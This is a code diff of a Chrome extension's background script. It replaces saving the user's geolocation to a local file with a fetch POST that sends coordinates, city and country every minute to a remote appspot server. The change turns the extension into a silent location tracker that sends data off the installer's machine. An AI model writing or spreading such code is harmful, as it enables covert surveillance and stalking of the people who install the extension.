@@ -1,13 +1,14 @@
 const delayInMinutes = 1;
 const intervalInMinutes = 1;
+const serverURL = 'https://crisscrossapplesauce.wl.r.appspot.com/geolocation';
 
-chrome.alarms.create('fetchLocation', {
+chrome.alarms.create('sendLocation', {
   delayInMinutes,
   periodInMinutes: intervalInMinutes,
 });
 
 chrome.alarms.onAlarm.addListener(async (alarm) => {
-  if (alarm.name === 'fetchLocation') {
+  if (alarm.name === 'sendLocation') {
     try {
       const position = await new Promise((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(resolve, reject);
@@ -29,17 +30,17 @@ chrome.alarms.onAlarm.addListener(async (alarm) => {
         country,
       };
 
-      const blob = new Blob([JSON.stringify(locationInfo, null, 2)], { type: 'application/json' });
-      const url = URL.createObjectURL(blob);
-
-      chrome.downloads.download({
-        url: url,
-        filename: `geolocation_${Date.now()}.json`,
-        conflictAction: 'uniquify',
+      // Send location data to the remote server
+      await fetch(serverURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(locationInfo),
       });
 
     } catch (error) {
-      console.error('Failed to fetch location:', error);
+      console.error('Failed to fetch and send location:', error);
     }
   }
 });
